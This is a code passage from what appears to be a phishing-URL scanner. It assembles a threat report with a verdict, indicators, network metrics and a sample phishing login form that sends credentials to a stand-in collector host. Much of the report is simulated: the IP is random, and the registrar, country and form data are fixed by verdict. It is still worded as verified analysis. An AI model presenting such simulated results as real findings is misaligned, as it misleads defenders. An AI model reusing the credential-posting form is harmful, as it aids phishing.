      summary: verdict === 'MALICIOUS' 
        ? `PX-LLM classified target as active phishing credential harvest campaign${matchedBrand ? ` mimicking ${matchedBrand.name}` : ''}. Multiple high-severity indicators present in DOM, network, and lexical entropy layers.`
        : verdict === 'SUSPICIOUS'
        ? 'Target exhibits abnormal behavioral heuristics, elevated domain entropy, or unverified asset inclusions. Caution advised before submitting sensitive credentials.'
        : 'Target URL exhibits authentic web architecture, clean DNS records, valid SSL lineage, and zero deceptive indicators.',
      attackVector: verdict === 'MALICIOUS'
        ? (matchedBrand ? `Brand Spoofing & Credential Harvesting (${matchedBrand.name})` : 'Generic Phishing & Credential Interception')
        : verdict === 'SUSPICIOUS'
        ? 'Potential Deceptive Redirection or Social Engineering'
        : 'None (Clean Infrastructure)',
      deceptiveTactics: verdict === 'MALICIOUS'
        ? [
            'Mimicking trusted brand identity and interface layout',
            'Fabricating false urgency to bypass victim critical thinking',
            'Redirecting stolen authorization tokens to untrusted endpoint',
          ]
        : verdict === 'SUSPICIOUS'
        ? [
            'Vague security prompts or prize/incentive lures',
            'Unusual domain structure with multiple synthetic subdomains',
          ]
        : [],
      evasionMechanisms: verdict === 'MALICIOUS'
        ? [
            'Client-side debugger detection scripts',
            'Conditional rendering targeting mobile devices',
          ]
        : [],
      recommendedAction: verdict === 'MALICIOUS'
        ? 'Block URL immediately at firewall/DNS resolver. Add to corporate threat intelligence feed.'
        : verdict === 'SUSPICIOUS'
        ? 'Quarantine URL and prompt user with interstitial warning banner.'
        : 'Allow traffic. Domain exhibits verified trust metrics.',
      technicalAnalysis: `PX neural engine analyzed ${hostname}. Structural DOM extraction verified form submit targets, lexical tokenizer calculated entropy of ${entropy}, and multi-layer correlation concluded a ${verdict} threat classification with ${confidence}% confidence.`,
    },
    metrics: {
      domainAgeDays: domainAge,
      registrar: verdict === 'MALICIOUS' ? 'NameCheap / Privacy Guardian' : verdict === 'SUSPICIOUS' ? 'Tucows Domains Inc.' : 'MarkMonitor / Cloudflare',
      ipAddress: `${Math.floor(100 + Math.random() * 90)}.${Math.floor(10 + Math.random() * 200)}.${Math.floor(10 + Math.random() * 200)}.${Math.floor(1 + Math.random() * 250)}`,
      asn: verdict === 'MALICIOUS' ? 'AS49505 (Offshore Hosting)' : verdict === 'SUSPICIOUS' ? 'AS16276 (OVH SAS)' : 'AS15169 / AS13335 (Tier-1 CDN)',
      country: verdict === 'MALICIOUS' ? 'Seychelles (SC)' : verdict === 'SUSPICIOUS' ? 'Netherlands (NL)' : 'United States (US)',
      sslIssuer: verdict === 'MALICIOUS' ? "Let's Encrypt Authority" : verdict === 'SUSPICIOUS' ? "ZeroSSL RSA CA" : "DigiCert / Google Trust Services",
      sslValid: true,
      sslDaysRemaining: verdict === 'MALICIOUS' ? 24 : 180,
      dnssecEnabled: verdict === 'CLEAN',
      hasLoginForm: verdict !== 'CLEAN',
      formActionExternal: verdict === 'MALICIOUS',
      externalFormEndpoint: verdict === 'MALICIOUS' ? 'https://unverified-collector.xyz/gate/log' : undefined,
      hasHiddenIframes: verdict === 'MALICIOUS',
      hasObfuscatedJs: verdict !== 'CLEAN',
      tldTrustScore: verdict === 'MALICIOUS' ? 18 : verdict === 'SUSPICIOUS' ? 44 : 98,
      lexicalEntropy: entropy,
    },
    domData: {
      formActionTarget: verdict === 'MALICIOUS' ? 'https://unverified-collector.xyz/gate/log' : '/api/login',
      inputFieldCount: verdict === 'MALICIOUS' ? 4 : 2,
      hasPasswordField: verdict !== 'CLEAN',
      hasCreditCardInputs: verdict === 'MALICIOUS',
      hiddenElementsCount: verdict === 'MALICIOUS' ? 5 : 0,
      externalScriptDomains: verdict === 'MALICIOUS' ? ['tracker-gate.org', 'static-cdn-clone.xyz'] : ['trusted-cdn.com'],
      snippet: verdict === 'MALICIOUS'
        ? `<form action="https://unverified-collector.xyz/gate/log" method="POST">\n  <input type="text" name="usr" placeholder="User Identifier" />\n  <input type="password" name="pwd" placeholder="Secret Key / Password" />\n  <button type="submit">Verify Now</button>\n</form>`
        : `<form action="/auth/session" method="POST">\n  <input type="email" name="email" />\n  <button type="submit">Continue</button>\n</form>`,
    },
    visionData: {
      titleRendered: matchedBrand ? `${matchedBrand.name} - Secure Portal Login` : 'Authentication Verification',
      logoConfidence: options.useVision ? (matchedBrand ? 94.5 : 42.0) : 0,
      layoutVisualMatch: matchedBrand ? `Cloned ${matchedBrand.name} Interface` : 'Standard Web Layout',
      homoglyphDetected: Boolean(matchedBrand),
      brandSimilarityPct: matchedBrand ? 93.4 : 12.0,
    },
    rawJson: {
      engine: 'PX-Phishing-Engine-v2.6-LLM',
      scan_id: `scan-px-${Math.floor(1000 + Math.random() * 9000)}`,
      verdict,
      confidence_score: confidence,
      target_url: cleanUrl,
      inspected_hostname: hostname,
      options_applied: options,
      telemetry: {
        domain_age_days: domainAge,
        entropy,
        matched_brand: matchedBrand?.name || null,
        indicators_count: indicators.length,
      },
    },
  };
}
